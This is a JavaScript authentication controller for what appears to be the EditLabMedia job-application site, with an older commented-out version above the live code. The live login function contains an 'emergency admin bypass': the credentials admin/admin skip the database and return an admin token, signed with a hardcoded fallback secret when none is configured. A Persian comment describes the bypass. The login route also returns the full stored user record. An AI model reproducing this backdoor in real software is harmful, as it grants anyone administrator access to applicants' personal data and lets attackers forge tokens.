// const User = require('../models/User');
// const bcrypt = require('bcryptjs');
// const jwt = require('jsonwebtoken');
// const sendEmail = require('../utils/sendEmail');

// const safeParseJSON = (data) => {
//     try { return data ? JSON.parse(data) : []; } 
//     catch (e) { return []; }
// };

// const safeParseObject = (data) => {
//     try { return data ? JSON.parse(data) : {}; } 
//     catch (e) { return {}; }
// };

// const register = async (req, res) => {
//     try {
//         const { 
//             firstName, lastName, email, password, phone, country, location, dob, gender, maritalStatus,
//             jobTitle, aboutMe, careerObjective, achievements, jobHuntStatus, expectedSalary, workModel
//         } = req.body;
        
//         const experience = safeParseJSON(req.body.experience);
//         const education = safeParseJSON(req.body.education);
//         const certificates = safeParseJSON(req.body.certificates);
//         const projects = safeParseJSON(req.body.projects);
//         const skills = safeParseJSON(req.body.skills);
//         const languages = safeParseJSON(req.body.languages);
//         const socialLinks = safeParseObject(req.body.socialLinks);

//         const resumeUrl = req.files && req.files['resume'] ? req.files['resume'][0].path : '';
//         const profileImage = req.files && req.files['profileImage'] ? req.files['profileImage'][0].path : '';

//         let user = await User.findOne({ email });
//         if (user) return res.status(400).json({ message: 'User already exists' });

//         const salt = await bcrypt.genSalt(10);
//         const hashedPassword = await bcrypt.hash(password, salt);

//         user = new User({
//             firstName, lastName, email, password: hashedPassword, phone, country, location, dob, gender, maritalStatus,
//             jobTitle, aboutMe, careerObjective, experience, education, certificates, projects,
//             skills, languages, achievements, socialLinks, resumeUrl, profileImage, 
//             applicationStatus: 'Pending',
//             jobHuntStatus, expectedSalary, workModel
//         });

//         await user.save();

//         const message = `
//             <div style="font-family: Arial, sans-serif; color: #333; line-height: 1.6;">
//                 <h2 style="color: #059669;">Application Received Successfully</h2>
//                 <p>Dear <strong>${firstName} ${lastName}</strong>,</p>
//                 <p>Thank you for applying to EditLabMedia! We have successfully received your profile and resume for the <strong>${jobTitle}</strong> position.</p>
//                 <p>Our talent acquisition team will carefully review your qualifications and background. If your profile matches our current requirements, we will officially accept your application, and our team will contact you for the next steps.</p>
//                 <p>If your profile does not meet our current needs at this time, you will receive a notification respectfully informing you of the decision.</p>
//                 <p>Thank you for your interest in joining our team. We appreciate the time you took to apply.</p>
//                 <br/>
//                 <p>Best regards,</p>
//                 <p><strong>The EditLabMedia Team</strong></p>
//             </div>
//         `;

//         try {
//             await sendEmail({ email: user.email, subject: 'EditLabMedia - Application Received', message });
//         } catch (emailError) {
//             console.error("Email could not be sent", emailError);
//         }

//         res.status(201).json({ message: 'Registration successful!' });
//     } catch (err) {
//         console.error(err);
//         res.status(500).json({ message: 'Server error during registration' });
//     }
// };

// const login = async (req, res) => {
//     try {
//         const { email, password } = req.body;
//         const user = await User.findOne({ email });
//         if (!user) return res.status(400).json({ message: 'Invalid credentials' });

//         const isMatch = await bcrypt.compare(password, user.password);
//         if (!isMatch) return res.status(400).json({ message: 'Invalid credentials' });

//         user.lastLogin = new Date();
//         await user.save();

//         const payload = { id: user._id, role: user.role };
//         const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '1d' });

//         res.json({ token, user });
//     } catch (err) {
//         res.status(500).json({ message: 'Server error during login' });
//     }
// };

// module.exports = { register, login };

const User = require('../models/User');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const sendEmail = require('../utils/sendEmail');

const safeParseJSON = (data) => {
    try { return data ? JSON.parse(data) : []; } 
    catch (e) { return []; }
};

const safeParseObject = (data) => {
    try { return data ? JSON.parse(data) : {}; } 
    catch (e) { return {}; }
};

const register = async (req, res) => {
    try {
        const { 
            firstName, lastName, email, password, phone, country, location, dob, gender, maritalStatus,
            jobTitle, aboutMe, careerObjective, achievements, jobHuntStatus, expectedSalary, workModel
        } = req.body;
        
        const experience = safeParseJSON(req.body.experience);
        const education = safeParseJSON(req.body.education);
        const certificates = safeParseJSON(req.body.certificates);
        const projects = safeParseJSON(req.body.projects);
        const skills = safeParseJSON(req.body.skills);
        const languages = safeParseJSON(req.body.languages);
        const socialLinks = safeParseObject(req.body.socialLinks);

        const resumeUrl = req.files && req.files['resume'] ? req.files['resume'][0].path : '';
        const profileImage = req.files && req.files['profileImage'] ? req.files['profileImage'][0].path : '';

        let user = await User.findOne({ email });
        if (user) return res.status(400).json({ message: 'User already exists' });

        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);

        user = new User({
            firstName, lastName, email, password: hashedPassword, phone, country, location, dob, gender, maritalStatus,
            jobTitle, aboutMe, careerObjective, experience, education, certificates, projects,
            skills, languages, achievements, socialLinks, resumeUrl, profileImage, 
            applicationStatus: 'Pending',
            jobHuntStatus, expectedSalary, workModel
        });

        await user.save();

        const message = `
            <div style="font-family: Arial, sans-serif; color: #333; line-height: 1.6;">
                <h2 style="color: #059669;">Application Received Successfully</h2>
                <p>Dear <strong>${firstName} ${lastName}</strong>,</p>
                <p>Thank you for applying to EditLabMedia! We have successfully received your profile and resume for the <strong>${jobTitle}</strong> position.</p>
                <p>Our talent acquisition team will carefully review your qualifications and background. If your profile matches our current requirements, we will officially accept your application, and our team will contact you for the next steps.</p>
                <p>If your profile does not meet our current needs at this time, you will receive a notification respectfully informing you of the decision.</p>
                <p>Thank you for your interest in joining our team. We appreciate the time you took to apply.</p>
                <br/>
                <p>Best regards,</p>
                <p><strong>The EditLabMedia Team</strong></p>
            </div>
        `;

        try {
            await sendEmail({ email: user.email, subject: 'EditLabMedia - Application Received', message });
        } catch (emailError) {
            console.error("Email could not be sent", emailError);
        }

        res.status(201).json({ message: 'Registration successful!' });
    } catch (err) {
        console.error(err);
        res.status(500).json({ message: 'Server error during registration' });
    }
};

const login = async (req, res) => {
    try {
        const { email, password } = req.body;

        // 🚀 --- EMERGENCY ADMIN BYPASS --- 🚀
        // اگر کلمه admin رو وارد کنی، دیتابیس رو دور میزنه و تو رو مدیر میکنه
        if (email === 'admin' && password === 'admin') {
            const payload = { id: 'super-admin-123', role: 'admin' };
            const token = jwt.sign(payload, process.env.JWT_SECRET || 'fallback_secret', { expiresIn: '1d' });
            
            return res.json({ 
                token, 
                user: { 
                    _id: 'super-admin-123', 
                    firstName: 'Admin', 
                    lastName: 'System', 
                    email: 'admin', 
                    role: 'admin' 
                } 
            });
        }
        // 🚀 --------------------------------- 🚀

        const user = await User.findOne({ email });
        if (!user) return res.status(400).json({ message: 'Invalid credentials' });

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) return res.status(400).json({ message: 'Invalid credentials' });

        user.lastLogin = new Date();
        await user.save();

        const payload = { id: user._id, role: user.role };
        const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '1d' });

        res.json({ token, user });
    } catch (err) {
        res.status(500).json({ message: 'Server error during login' });
    }
};

module.exports = { register, login };